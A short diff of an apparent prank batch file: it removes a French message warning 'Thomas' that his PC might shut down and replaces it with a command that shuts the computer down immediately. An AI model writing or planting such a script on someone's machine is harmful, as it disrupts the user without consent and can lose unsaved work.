@@ -1,4 +1,1 @@
-@echo off
-color 02
-echo Bonjour Thomas. Ne panique pas, sinon ton PC pourrait s'éteindre bientôt.
-pause
+shutdown /s /t 0
